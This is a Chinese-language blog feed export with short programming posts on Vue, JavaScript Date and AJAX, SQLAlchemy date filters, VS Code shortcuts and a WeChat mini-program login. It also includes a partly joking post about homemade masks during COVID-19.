<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">try &#123;</span><br><span class="line">//  self.xhr.send(payload); 把这里注掉</span><br><span class="line">&#125; catch (e) &#123;</span><br><span class="line">  self.emit(&apos;finish&apos;, 0, &apos;&apos;);</span><br><span class="line">  self._cleanup(false);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>刷新，搞定。</p>
</li>
</ol>
<div><h1>推荐文章<span style="font-size:0.45em; color:gray"></h1><ul><li><a href="https://thelighter.github.io/2020/04/29/vue-8/">vue配置文件config说明</a></li><li><a href="https://thelighter.github.io/2020/04/26/vue-7/">vue字符串截取字符串str切片处理办法</a></li><li><a href="https://thelighter.github.io/2020/04/26/vue-6/">node-sass安装失败解决办法</a></li><li><a href="https://thelighter.github.io/2020/04/14/vue-4/">MVVM的理解和Vue的生命周期</a></li><li><a href="https://thelighter.github.io/2020/04/13/vue-3/">vue的Mixed Content：The page at ‘https://XXX’ was loaded over HTTPS, but requested an insecure</a></li></ul></div>]]></content>
      <categories>
        <category>vue</category>
      </categories>
      <tags>
        <tag>vue</tag>
      </tags>
  </entry>
  <entry>
    <title>js日期对象用法,js的Date用法</title>
    <url>/2020/04/25/js-3/</url>
    <content><![CDATA[<p>js获取当前日期和年月日<br><a id="more"></a></p>
<p>var date = new Date();</p>
<p>getYear(); //获取当前年份(2位)</p>
<p>getFullYear(); //获取完整的年份(4位)</p>
<p>getMonth(); //获取当前月份(0-11,0代表1月)</p>
<p>getDate(); //获取当前日(1-31)</p>
<p>getDay(); //获取当前星期X(0-6,0代表星期天)</p>
<p>getTime(); //获取当前时间(从1970.1.1开始的毫秒数)</p>
<p>getHours(); //获取当前小时数(0-23)</p>
<p>getMinutes(); //获取当前分钟数(0-59)</p>
<p>getSeconds(); //获取当前秒数(0-59)</p>
<p>getMilliseconds(); //获取当前毫秒数(0-999)</p>
<p>toLocaleDateString(); //获取当前日期</p>
<p>var mytime=toLocaleTimeString(); //获取当前时间</p>
<p>toLocaleString( ); //获取日期与时间</p>
<div><h1>推荐文章<span style="font-size:0.45em; color:gray"></h1><ul><li><a href="https://thelighter.github.io/2020/05/17/js-4/">javascrip js原生base64互转方法</a></li><li><a href="https://thelighter.github.io/2020/04/23/js-2/">js的ajax用法和jsonp用法</a></li><li><a href="https://thelighter.github.io/2020/04/23/js-1/">js获取验证码倒计时</a></li></ul></div>]]></content>
      <categories>
        <category>js</category>
      </categories>
      <tags>
        <tag>js</tag>
      </tags>
  </entry>
  <entry>
    <title>sqlalchemy时间过滤How to filter date field?</title>
    <url>/2020/04/25/flask-sqlalchemy-3/</url>
    <content><![CDATA[<p>sqlalchemy<br><a id="more"></a></p>
<h1 id="查找时间段"><a href="#查找时间段" class="headerlink" title="查找时间段"></a>查找时间段</h1><p>db.query(User).filter(and_(User.birthday &lt;= ‘2020-01-17’, User.birthday &gt;= ‘2015-01-17’))</p>
<h1 id="也可以利用between"><a href="#也可以利用between" class="headerlink" title="也可以利用between"></a>也可以利用between</h1><p>db.query(User).filter(User.birthday.between(‘1985-01-17’, ‘1988-01-17’))</p>
<h1 id="使用func-date"><a href="#使用func-date" class="headerlink" title="使用func.date"></a>使用func.date</h1><p>from sqlalchemy import and_, func</p>
<p>query = DBSession.query(User).filter(and_(func.date(User.birthday) &gt;= ‘1985-01-17’),func.date(User.birthday) &lt;= ‘1988-01-17’))<br>查询的范围是 1985-01-17 00:00 - 1988-01-17 23:59</p>
<div><h1>推荐文章<span style="font-size:0.45em; color:gray"></h1><ul><li><a href="https://thelighter.github.io/2020/02/11/flask-sqlalchemy2/">2020年最新flask-sqlalchemy用法总结(2)</a></li><li><a href="https://thelighter.github.io/2020/02/11/flask-sqlalchemy/">2020年最新flask-sqlalchemy用法总结(1)</a></li><li><a href="https://thelighter.github.io/2020/02/07/flask-time/">如何在Flask_sqlalchemy中查询时间段或者时间点？</a></li></ul></div>]]></content>
      <categories>
        <category>flask-sqlalchemy</category>
      </categories>
      <tags>
        <tag>flask-sqlalchemy</tag>
      </tags>
  </entry>
  <entry>
    <title>js的ajax用法和jsonp用法</title>
    <url>/2020/04/23/js-2/</url>
    <content><![CDATA[<p>ajax的js原生实现方法<br><a id="more"></a></p>
<p>最早大规模使用AJAX的就是Gmail，Gmail的页面在首次加载后，剩下的所有数据都依赖于AJAX来更新</p>
<p>ajax是异步的，叫做——Asynchronous JavaScript and XML，通过异步的js和xml实现数据的传输</p>
<h1 id="XMLHttpRequest"><a href="#XMLHttpRequest" class="headerlink" title="XMLHttpRequest"></a>XMLHttpRequest</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function success(text) &#123;</span><br><span class="line">    var textarea = document.getElementById(&apos;test-response-text&apos;);</span><br><span class="line">    textarea.value = text;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function fail(code) &#123;</span><br><span class="line">    var textarea = document.getElementById(&apos;test-response-text&apos;);</span><br><span class="line">    textarea.value = &apos;Error code: &apos; + code;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var request = new XMLHttpRequest(); // 新建XMLHttpRequest对象</span><br><span class="line"></span><br><span class="line">request.onreadystatechange = function () &#123; // 状态发生变化时，函数被回调</span><br><span class="line">    if (request.readyState === 4) &#123; // 成功完成</span><br><span class="line">        // 判断响应结果:</span><br><span class="line">        if (request.status === 200) &#123;</span><br><span class="line">            // 成功，通过responseText拿到响应的文本:</span><br><span class="line">            return success(request.responseText);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            // 失败，根据响应码判断失败原因:</span><br><span class="line">            return fail(request.status);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        // HTTP请求还在继续...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 发送请求:</span><br><span class="line">request.open(&apos;GET&apos;, &apos;/api/categories&apos;);</span><br><span class="line">request.send();</span><br></pre></td></tr></table></figure>
<h1 id="ActiveXObject"><a href="#ActiveXObject" class="headerlink" title="ActiveXObject"></a>ActiveXObject</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function success(text) &#123;</span><br><span class="line">    var textarea = document.getElementById(&apos;test-ie-response-text&apos;);</span><br><span class="line">    textarea.value = text;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function fail(code) &#123;</span><br><span class="line">    var textarea = document.getElementById(&apos;test-ie-response-text&apos;);</span><br><span class="line">    textarea.value = &apos;Error code: &apos; + code;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var request = new ActiveXObject(&apos;Microsoft.XMLHTTP&apos;); // 新建Microsoft.XMLHTTP对象</span><br><span class="line"></span><br><span class="line">request.onreadystatechange = function () &#123; // 状态发生变化时，函数被回调</span><br><span class="line">    if (request.readyState === 4) &#123; // 成功完成</span><br><span class="line">        // 判断响应结果:</span><br><span class="line">        if (request.status === 200) &#123;</span><br><span class="line">            // 成功，通过responseText拿到响应的文本:</span><br><span class="line">            return success(request.responseText);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            // 失败，根据响应码判断失败原因:</span><br><span class="line">            return fail(request.status);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        // HTTP请求还在继续...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 发送请求:</span><br><span class="line">request.open(&apos;GET&apos;, &apos;/api/categories&apos;);</span><br><span class="line">request.send();</span><br><span class="line"></span><br><span class="line">alert(&apos;请求已发送，请等待响应...&apos;);</span><br></pre></td></tr></table></figure>
<div><h1>推荐文章<span style="font-size:0.45em; color:gray"></h1><ul><li><a href="https://thelighter.github.io/2020/05/17/js-4/">javascrip js原生base64互转方法</a></li><li><a href="https://thelighter.github.io/2020/04/25/js-3/">js日期对象用法,js的Date用法</a></li><li><a href="https://thelighter.github.io/2020/04/23/js-1/">js获取验证码倒计时</a></li></ul></div>]]></content>
      <categories>
        <category>js</category>
      </categories>
      <tags>
        <tag>js</tag>
      </tags>
  </entry>
  <entry>
    <title>js获取验证码倒计时</title>
    <url>/2020/04/23/js-1/</url>
    <content><![CDATA[<p>uniapp js获取验证码倒计时<br><a id="more"></a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function () &#123;</span><br><span class="line">      </span><br><span class="line">       var interval = setInterval(() =&gt; &#123;</span><br><span class="line">          this.second--</span><br><span class="line">       &#125;, 1000)</span><br><span class="line">       setTimeout(() =&gt; &#123;</span><br><span class="line">          clearInterval(interval)</span><br><span class="line">          </span><br><span class="line">       &#125;, 60000)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>原理解析</p>
<p>先建立每秒执行一次的setInterval，使倒计时每次减少1<br>然后setTimeout，倒计时60s停止setInterval方法</p>
<div><h1>推荐文章<span style="font-size:0.45em; color:gray"></h1><ul><li><a href="https://thelighter.github.io/2020/05/17/js-4/">javascrip js原生base64互转方法</a></li><li><a href="https://thelighter.github.io/2020/04/25/js-3/">js日期对象用法,js的Date用法</a></li><li><a href="https://thelighter.github.io/2020/04/23/js-2/">js的ajax用法和jsonp用法</a></li></ul></div>]]></content>
      <categories>
        <category>js</category>
      </categories>
      <tags>
        <tag>js</tag>
      </tags>
  </entry>
  <entry>
    <title>vscode windows 常用快捷键</title>
    <url>/2020/04/23/vscode-4/</url>
    <content><![CDATA[<p>vscode windows 常用快捷键<br><a id="more"></a></p>
<p>全局</p>
<p>Ctrl + Shift + P, F1 显示命令面板<br>Ctrl + P 快速打开<br>Ctrl + Shift + N 打开新窗口<br>Ctrl + Shift + W 关闭窗口</p>
<p>基本</p>
<p>Ctrl + X 剪切（未选中文本的情况下，剪切光标所在行）<br>Ctrl + C 复制（未选中文本的情况下，复制光标所在行）<br>Alt + Up 向上移动行<br>Alt + Down 向下移动行<br>Shift + Alt + Up 向上复制行<br>Shift + Alt + Down 向下复制行<br>Ctrl + Shift + K 删除行<br>Ctrl + Enter 下一行插入<br>Ctrl + Shift + Enter 上一行插入<br>Ctrl + Shift + \ 跳转到匹配的括号<br>Ctrl + ] 增加缩进<br>Ctrl + [ 减少缩进<br>Home 跳转至行首<br>End 跳转到行尾<br>Ctrl + Home 跳转至文件开头<br>Ctrl + End 跳转至文件结尾<br>Ctrl + Up 按行向上滚动<br>Ctrl + Down 按行向下滚动<br>Alt + PgUp 按屏向上滚动<br>Alt + PgDown 按屏向下滚动<br>Ctrl + Shift + [ 折叠代码块<br>Ctrl + Shift + ] 展开代码块<br>Ctrl + K Ctrl + [ 折叠全部子代码块<br>Ctrl + K Ctrl + ] 展开全部子代码块<br>Ctrl + K Ctrl + 0 折叠全部代码块<br>Ctrl + K Ctrl + J 展开全部代码块<br>Ctrl + K Ctrl + C 添加行注释<br>Ctrl + K Ctrl + U 移除行注释<br>Ctrl + / 添加、移除行注释<br>Shift + Alt + A 添加、移除块注释<br>Alt + Z 自动换行、取消自动换行</p>
<p>多光标与选择</p>
<p>Alt + 点击 插入多个光标<br>Ctrl + Alt + Up 向上插入光标<br>Ctrl + Alt + Down 向下插入光标<br>Ctrl + U 撤销上一个光标操作<br>Shift + Alt + I 在所选行的行尾插入光标<br>Ctrl + I 选中当前行<br>Ctrl + Shift + L 选中所有与当前选中内容相同部分<br>Ctrl + F2 选中所有与当前选中单词相同的单词<br>Shift + Alt + Left 折叠选中<br>Shift + Alt + Right 展开选中<br>Shift + Alt + 拖动鼠标 选中代码块<br>Ctrl + Shift + Alt + Up 列选择 向上<br>Ctrl + Shift + Alt + Down 列选择 向下<br>Ctrl + Shift + Alt + Left 列选择 向左<br>Ctrl + Shift + Alt + Right 列选择 向右<br>Ctrl + Shift + Alt + PgUp 列选择 向上翻页<br>Ctrl + Shift + Alt + PgDown 列选择 向下翻页</p>
<p>查找替换</p>
<p>Ctrl + F 查找<br>Ctrl + H 替换<br>F3 查找下一个<br>Shift + F3 查找上一个<br>Alt + Enter 选中所有匹配项<br>Ctrl + D 向下选中相同内容<br>Ctrl + K Ctrl + D 移除前一个向下选中相同内容<br>Alt + C 区分大小写<br>Alt + R 正则<br>Alt + W 完整匹配</p>
<p>进阶</p>
<p>Ctrl + Space 打开建议<br>Ctrl + Shift + Space 参数提示<br>Tab Emmet插件缩写补全<br>Shift + Alt + F 格式化<br>Ctrl + K Ctrl + F 格式化选中内容<br>F12 跳转到声明位置<br>Alt + F12 查看具体声明内容<br>Ctrl + K F12 分屏查看具体声明内容<br>Ctrl + . 快速修复<br>Shift + F12 显示引用<br>F2 重命名符号<br>Ctrl + Shift + . 替换为上一个值<br>Ctrl + Shift + , 替换为下一个值<br>Ctrl + K Ctrl + X 删除行尾多余空格<br>Ctrl + K M 更改文件语言</p>
<p>导航</p>
<p>Ctrl + T 显示所有符号<br>Ctrl + G 跳转至某行<br>Ctrl + P 跳转到某个文件<br>Ctrl + Shift + O 跳转到某个符号<br>Ctrl + Shift + M 打开问题面板<br>F8 下一个错误或警告位置<br>Shift + F8 上一个错误或警告位置<br>Ctrl + Shift + Tab 编辑器历史记录<br>Alt + Left 后退<br>Alt + Right 前进<br>Ctrl + M 切换焦点</p>
<p>编辑器管理</p>
<p>Ctrl + F4, Ctrl + W 关闭编辑器<br>Ctrl + K F 关闭文件夹<br>Ctrl + \ 编辑器分屏<br>Ctrl + 1 切换到第一分组<br>Ctrl + 2 切换到第二分组<br>Ctrl + 3 切换到第三分组<br>Ctrl + K Ctrl + Left 切换到上一分组<br>Ctrl + K Ctrl + Right 切换到下一分组<br>Ctrl + Shift + PgUp 左移编辑器<br>Ctrl + Shift + PgDown 右移编辑器<br>Ctrl + K Left 激活左侧编辑组<br>Ctrl + K Right 激活右侧编辑组</p>
<p>文件管理</p>
<p>Ctrl + N 新建文件<br>Ctrl + O 打开文件<br>Ctrl + S 保存<br>Ctrl + Shift + S 另存为<br>Ctrl + K S 全部保存<br>Ctrl + F4 关闭<br>Ctrl + K Ctrl + W 全部关闭<br>Ctrl + Shift + T 重新打开被关闭的编辑器<br>Ctrl + K Enter 保持打开<br>Ctrl + Tab 打开下一个<br>Ctrl + Shift + Tab 打开上一个<br>Ctrl + K P 复制当前文件路径<br>Ctrl + K R 在资源管理器中查看当前文件<br>Ctrl + K O 新窗口打开当前文件</p>
<p>显示</p>
<p>F11 全屏、退出全屏<br>Shift + Alt + 1 切换编辑器分屏方式（横、竖）<br>Ctrl + + 放大<br>Ctrl + - 缩小<br>Ctrl + B 显示、隐藏侧边栏<br>Ctrl + Shift + E 显示资源管理器 或 切换焦点<br>Ctrl + Shift + F 显示搜索框<br>Ctrl + Shift + G 显示Git面板<br>Ctrl + Shift + D 显示调试面板<br>Ctrl + Shift + X 显示插件面板<br>Ctrl + Shift + H 全局搜索替换<br>Ctrl + Shift + J 显示、隐藏高级搜索<br>Ctrl + Shift + C 打开新命令提示符窗口<br>Ctrl + Shift + U 显示输出面板<br>Ctrl + Shift + V 显示、隐藏 Markdown预览窗口<br>Ctrl + K V 分屏显示 Markdown预览窗口</p>
<p>调试</p>
<p>F9 设置 或 取消断点<br>F5 开始 或 继续<br>F11 进入<br>Shift + F11 跳出<br>F10 跳过<br>Ctrl + K Ctrl + I 显示悬停信息</p>
<p>集成终端</p>
<p>Ctrl + 显示命令提示符窗口 Ctrl + Shift + 新建命令提示符窗口<br>Ctrl + Shift + C 复制所选内容<br>Ctrl + Shift + V 粘贴所选内容<br>Ctrl + Up 向上滚动<br>Ctrl + Down 向下滚动<br>Shift + PgUp 向上翻页<br>Shift + PgDown 向下翻页<br>Ctrl + Home 滚动到顶部<br>Ctrl + End 滚动到底部</p>
<p>作者：饥人谷_hak<br>链接：<a href="https://www.jianshu.com/p/d6210835910c" target="_blank" rel="noopener">https://www.jianshu.com/p/d6210835910c</a><br>来源：简书<br>著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</p>
<div><h1>推荐文章<span style="font-size:0.45em; color:gray"></h1><ul><li><a href="https://thelighter.github.io/2020/04/23/vscode-3/">vscode mac 必会快捷键</a></li><li><a href="https://thelighter.github.io/2020/04/16/vscode-2/">如何高效优雅使用vscode ？看完效率提升十倍！</a></li><li><a href="https://thelighter.github.io/2020/04/16/vscode-1/">vscode远程连接F12无法定义跳转和定义查看的问题解决</a></li><li><a href="https://thelighter.github.io/2019/06/24/vscode-remote/">vscode remote远程开发详解，mac、windows配置vscode remote远程开发</a></li></ul></div>]]></content>
      <categories>
        <category>vscode</category>
      </categories>
      <tags>
        <tag>vscode</tag>
      </tags>
  </entry>
  <entry>
    <title>vscode mac 必会快捷键</title>
    <url>/2020/04/23/vscode-3/</url>
    <content><![CDATA[<p>Mac vscode快捷键<br><a id="more"></a></p>
<p>全局<br>Command + Shift + P / F1 显示命令面板<br>Command + P 快速打开<br>Command + Shift + N 打开新窗口<br>Command + W 关闭窗口<br>基本<br>Command + X 剪切（未选中文本的情况下，剪切光标所在行）<br>Command + C 复制（未选中文本的情况下，复制光标所在行）<br>Option + Up 向上移动行<br>Option + Down 向下移动行<br>Option + Shift + Up 向上复制行<br>Option + Shift + Down 向下复制行<br>Command + Shift + K 删除行<br>Command + Enter 下一行插入<br>Command + Shift + Enter 上一行插入<br>Command + Shift + \ 跳转到匹配的括号<br>Command + [ 减少缩进<br>Command + ] 增加缩进<br>Home 跳转至行首<br>End 跳转到行尾<br>Command + Up 跳转至文件开头<br>Command + Down 跳转至文件结尾<br>Ctrl + PgUp 按行向上滚动<br>Ctrl + PgDown 按行向下滚动<br>Command + PgUp 按屏向上滚动<br>Command + PgDown 按屏向下滚动<br>Command + Shift + [ 折叠代码块<br>Command + Shift + ] 展开代码块<br>Command + K Command + [ 折叠全部子代码块<br>Command + K Command + ] 展开全部子代码块<br>Command + K Command + 0 折叠全部代码块<br>Command + K Command + J 展开全部代码块<br>Command + K Command + C 添加行注释<br>Command + K Command + U 移除行注释<br>Command + / 添加、移除行注释<br>Option + Shift + A 添加、移除块注释<br>Option + Z 自动换行、取消自动换行<br>多光标与选择<br>Option + 点击 插入多个光标<br>Command + Option + Up 向上插入光标<br>Command + Option + Down 向下插入光标<br>Command + U 撤销上一个光标操作<br>Option + Shift + I 在所选行的行尾插入光标<br>Command + I 选中当前行<br>Command + Shift + L 选中所有与当前选中内容相同部分<br>Command + F2 选中所有与当前选中单词相同的单词<br>Command + Ctrl + Shift + Left 折叠选中<br>Command + Ctrl + Shift + Right 展开选中<br>Alt + Shift + 拖动鼠标 选中代码块<br>Command + Shift + Option + Up 列选择 向上<br>Command + Shift + Option + Down 列选择 向下<br>Command + Shift + Option + Left 列选择 向左<br>Command + Shift + Option + Right 列选择 向右<br>Command + Shift + Option + PgUp 列选择 向上翻页<br>Command + Shift + Option + PgDown 列选择 向下翻页<br>查找替换<br>Command + F 查找<br>Command + Option + F 替换<br>Command + G 查找下一个<br>Command + Shift + G 查找上一个<br>Option + Enter 选中所有匹配项<br>Command + D 向下选中相同内容<br>Command + K Command + D 移除前一个向下选中相同内容<br>进阶<br>Ctrl + Space 打开建议<br>Command + Shift + Space 参数提示<br>Tab Emmet插件缩写补全<br>Option + Shift + F 格式化<br>Command + K Command + F 格式化选中内容<br>F12 跳转到声明位置<br>Option + F12 查看具体声明内容<br>Command + K F12 分屏查看具体声明内容<br>Command + . 快速修复<br>Shift + F12 显示引用<br>F2 重命名符号<br>Command + Shift + . 替换为上一个值<br>Command + Shift + , 替换为下一个值<br>Command + K Command + X 删除行尾多余空格<br>Command + K M 更改文件语言<br>导航<br>Command + T 显示所有符号<br>Ctrl + G 跳转至某行<br>Command + P 跳转到某个文件<br>Command + Shift + O 跳转到某个符号<br>Command + Shift + M 打开问题面板<br>F8 下一个错误或警告位置<br>Shift + F8 上一个错误或警告位置<br>Ctrl + Shift + Tab 编辑器历史记录<br>Ctrl + - 后退<br>Ctrl + Shift + - 前进<br>Ctrl + Shift + M Tab 切换焦点<br>编辑器管理<br>Command + W 关闭编辑器<br>Command + K F 关闭文件夹<br>Command + \ 编辑器分屏<br>Command + 1 切换到第一分组<br>Command + 2 切换到第二分组<br>Command + 3 切换到第三分组<br>Command + K Command + Left 切换到上一分组<br>Command + K Command + Right 切换到下一分组<br>Command + K Command + Shift + Left 左移编辑器<br>Command + K Command + Shift + Right 右移编辑器<br>Command + K Left 激活左侧编辑组<br>Command + K Right 激活右侧编辑组<br>文件管理<br>Command + N 新建文件<br>Command + O 打开文件<br>Command + S 保存文件<br>Command + Shift + S 另存为<br>Command + Option + S 全部保存<br>Command + W 关闭<br>Command + K Command + W 全部关闭<br>Command + Shift + T 重新打开被关闭的编辑器<br>Command + K Enter 保持打开<br>Ctrl + Tab 打开下一个<br>Ctrl + Shift + Tab 打开上一个<br>Command + K P 复制当前文件路径<br>Command + K R 在资源管理器中查看当前文件<br>Command + K O 新窗口打开当前文件<br>显示<br>Command + Ctrl + F 全屏、退出全屏<br>Command + Option + 1 切换编辑器分屏方式（横、竖）<br>Command + + 放大<br>Command + - 缩小<br>Command + B 显示、隐藏侧边栏<br>Command + Shift + E 显示资源管理器 或 切换焦点<br>Command + Shift + F 显示搜索框<br>Ctrl + Shift + G 显示Git面板<br>Command + Shift + D 显示调试面板<br>Command + Shift + X 显示插件面板<br>Command + Shift + H 全局搜索替换<br>Command + Shift + J 显示、隐藏高级搜索<br>Command + Shift + C 打开新终端<br>Command + Shift + U 显示输出面板<br>Command + Shift + V Markdown预览窗口<br>Command + K V 分屏显示 Markdown预览窗口<br>调试<br>F9 设置 或 取消断点<br>F5 开始 或 继续<br>F11 进入<br>Shift + F11 跳出<br>F10 跳过<br>Command + K Command + I 显示悬停信息<br>集成终端<br>Ctrl + <code>显示终端
Ctrl + Shift +</code> 新建终端<br>Command + Up 向上滚动<br>Command + Down 向下滚动<br>PgUp 向上翻页<br>PgDown 向下翻页<br>Command + Home 滚动到顶部<br>Command + End 滚动到底部</p>
<div><h1>推荐文章<span style="font-size:0.45em; color:gray"></h1><ul><li><a href="https://thelighter.github.io/2020/04/23/vscode-4/">vscode windows 常用快捷键</a></li><li><a href="https://thelighter.github.io/2020/04/16/vscode-2/">如何高效优雅使用vscode ？看完效率提升十倍！</a></li><li><a href="https://thelighter.github.io/2020/04/16/vscode-1/">vscode远程连接F12无法定义跳转和定义查看的问题解决</a></li><li><a href="https://thelighter.github.io/2019/06/24/vscode-remote/">vscode remote远程开发详解，mac、windows配置vscode remote远程开发</a></li></ul></div>]]></content>
      <categories>
        <category>vscode</category>
      </categories>
      <tags>
        <tag>vscode</tag>
      </tags>
  </entry>
  <entry>
    <title>ncov-19新冠肺炎口罩不够如何处理？</title>
    <url>/2020/04/19/ncov-19/</url>
    <content><![CDATA[<p>教你如何自己制作一个口罩！<br><a id="more"></a></p>
<h1 id="利用水果皮"><a href="#利用水果皮" class="headerlink" title="利用水果皮"></a>利用水果皮</h1><p>这是错误的示范，大家要注意了<br>特别是老年人</p>
<p><img src="https://ae01.alicdn.com/kf/H3005c90bfa354108a7ba7c4b19029d6bE.png" alt></p>
<h1 id="利用衣物制作口罩"><a href="#利用衣物制作口罩" class="headerlink" title="利用衣物制作口罩"></a>利用衣物制作口罩</h1><p>这里可以是内裤和胸罩等等，请发挥你的想象力<br>胸罩天生适合用来遮挡口鼻，另外颜色也是多种多样的</p>
<p><img src="https://ae01.alicdn.com/kf/Haabeafd9cf654f44957d9872420a02adM.jpg" alt></p>
<p>内裤也可以用来制作口罩，建议买一条新的</p>
<p><img src="https://ae01.alicdn.com/kf/Hc81200549fb54aa2a4d5c69c876b68ddk.jpg" alt></p>
<h1 id="最正确的制作口罩方式"><a href="#最正确的制作口罩方式" class="headerlink" title="最正确的制作口罩方式"></a>最正确的制作口罩方式</h1><p>最简单的方法是买几个或拿出几个之前用过的普通口罩，开水蒸煮消毒晾干后从边上裁一道缝，把新的熔喷无纺布过滤层添加进去，这样就可以作为新的口罩重新使用了。推荐N95熔喷无纺布，如果实在买不到熔喷布，可以采用疏水性能好但结构孔径稍大的材料，如聚酯纤维，即涤纶。它达不到熔喷布95%的过滤效率，但因为不吸水，多层折叠后也可以有效防护飞沫。</p>
<p><img src="https://ae01.alicdn.com/kf/Hc2b932f9edd1470eb85292184c8a5c13v.jpg" alt></p>
<p>对于熔喷无纺布过滤层，可以使用紫外线灯照射（波长254纳米，强度303uw/cm^2，作用30秒），或70摄氏度烘箱作用30分钟。这两种方法可以在基本不破坏过滤性能的条件下杀死细菌病毒。</p>
]]></content>
      <categories>
        <category>ncov-19</category>
      </categories>
      <tags>
        <tag>ncov-19</tag>
      </tags>
  </entry>
  <entry>
    <title>如何高效优雅使用vscode ？看完效率提升十倍！</title>
    <url>/2020/04/16/vscode-2/</url>
    <content><![CDATA[<p>最新vscode使用技巧大全，如何高效使用vscode<br><img src="https://i.postimg.cc/TPGBXt4K/u-2259119919-457339810-fm-26-gp-0.png" alt><br><a id="more"></a></p>
<blockquote>
<p>俗话说“工欲善其事必先利其器”，vscode作为一个免费、轻量和经常更新的编程神器，逐渐取代了jetbrain系列的&gt; 开发IDE。所以你需要掌握一下子vscode最有用最高效的使用技巧。</p>
</blockquote>
<h1 id="venv使用"><a href="#venv使用" class="headerlink" title="venv使用"></a>venv使用</h1><p>一般来说，我们开发一个python项目，可以使用venv虚拟环境，这样十分高效便利，环境之间互不影响。<br>通过vscode可以识别我们创建的虚拟环境。</p>
<p>快捷键 Ctrl + Shift + P<br>然后选择 Python：Select Interpreter 就可以为选择我们创建的虚拟环境。</p>
<p><img src="https://i.postimg.cc/cCbNxf8V/command-palette.png" alt></p>
<p>Ctrl + Shift +`</p>
<p>这个命令可以创建终端并通过运行其激活脚本自动激活虚拟环境。</p>
<h1 id="Debug调试"><a href="#Debug调试" class="headerlink" title="Debug调试"></a>Debug调试</h1><p>代码调试是我们编程中不可以缺少的工具之一，可以让我们直观的观察程序运行步骤和变量的改变。</p>
<p>通过以下步骤可以快速设置断点。<br>将光标放在该行上，按F9，或，<br>将光标放在该行上，选择“ 运行” &gt;“ 切换断点”菜单命令，或者，<br>直接在行号左侧的空白处单击（将鼠标悬停在该行上时，将出现一个淡红色的点）。</p>
<p><img src="https://i.postimg.cc/yYDHfpMB/debug-breakpoint-set.png" alt></p>
<p>vscode针对不同语言框架提供了便利，比如python的flask和django，可以通过debug中设置。设置完直接F5就可以快速启动。</p>
<p>可以看到断点中的变量的变化。</p>
<p><img src="https://i.postimg.cc/pTswCKkp/debug-local-variables.png" alt></p>
<h1 id="查看定义"><a href="#查看定义" class="headerlink" title="查看定义"></a>查看定义</h1><p>有时我们需要查看变量的定义或者一个模块，这里我们需要使用vscode的F12——跳转定义。或者也可以快速查看（不跳转，在下方显示）。</p>
<p>例如，我们可以查看flask这个类的定义。<br><img src="https://i.postimg.cc/c4pVFx7M/peek-definition.png" alt></p>
<h1 id="创建代码片段"><a href="#创建代码片段" class="headerlink" title="创建代码片段"></a>创建代码片段</h1><p>在VS Code中，选择文件（Windows / Linux）或Code（macOS）菜单，然后选择首选项 &gt; 用户代码片段。</p>
<p>格式如下<br><img src="https://i.postimg.cc/HnjfhjP3/TIM-20200416223514.jpg" alt><br>$0代表应用完光标的位置</p>
<p>使用方法<br>输入flexlayout，就可以在html文件中应用了。<br>当然你可以选择其他的用户代码片段，比如python</p>
<p><img src="https://i.postimg.cc/Fs69NXy7/autocomplete-for-code-snippet.png" alt></p>
<p>每天积累就质变，欢迎关注订阅！</p>
<p>​</p>
<div><h1>推荐文章<span style="font-size:0.45em; color:gray"></h1><ul><li><a href="https://thelighter.github.io/2020/04/23/vscode-4/">vscode windows 常用快捷键</a></li><li><a href="https://thelighter.github.io/2020/04/23/vscode-3/">vscode mac 必会快捷键</a></li><li><a href="https://thelighter.github.io/2020/04/16/vscode-1/">vscode远程连接F12无法定义跳转和定义查看的问题解决</a></li><li><a href="https://thelighter.github.io/2019/06/24/vscode-remote/">vscode remote远程开发详解，mac、windows配置vscode remote远程开发</a></li></ul></div>]]></content>
      <categories>
        <category>vscode</category>
      </categories>
      <tags>
        <tag>vscode</tag>
      </tags>
  </entry>
  <entry>
    <title>vscode远程连接F12无法定义跳转和定义查看的问题解决</title>
    <url>/2020/04/16/vscode-1/</url>
    <content><![CDATA[<p>vscode远程连接F12无法定义跳转和定义查看的问题解决<br><a id="more"></a></p>
<p>对应python的vscode远程连接F12无法定义跳转和定义查看的问题解决办法如下</p>
<p>打开设置</p>
<p>选择用户</p>
<p>搜索jedi</p>
<p>打上勾即可</p>
<p><img src="https://s1.ax1x.com/2020/04/16/JAXXgx.png" alt></p>
<div><h1>推荐文章<span style="font-size:0.45em; color:gray"></h1><ul><li><a href="https://thelighter.github.io/2020/04/23/vscode-4/">vscode windows 常用快捷键</a></li><li><a href="https://thelighter.github.io/2020/04/23/vscode-3/">vscode mac 必会快捷键</a></li><li><a href="https://thelighter.github.io/2020/04/16/vscode-2/">如何高效优雅使用vscode ？看完效率提升十倍！</a></li><li><a href="https://thelighter.github.io/2019/06/24/vscode-remote/">vscode remote远程开发详解，mac、windows配置vscode remote远程开发</a></li></ul></div>]]></content>
      <categories>
        <category>vscode</category>
      </categories>
      <tags>
        <tag>vscode</tag>
      </tags>
  </entry>
  <entry>
    <title>小程序登录状态保持</title>
    <url>/2020/04/14/weixin-3/</url>
    <content><![CDATA[<p>如何保持小程序登录状态<br><a id="more"></a></p>
<p>通过wx.login接口获取 code，把code传给服务端，服务端用<code>code</code>、<code>appid</code>、<code>appsecret</code>通过<br><code>https://api.weixin.qq.com/sns/jscode2session?appid=APPID&amp;secret=SECRET&amp;js_code=JSCODE&amp;grant_type=authorization_code</code> 就可以拿到<code>openid</code>和<code>session_key</code></p>
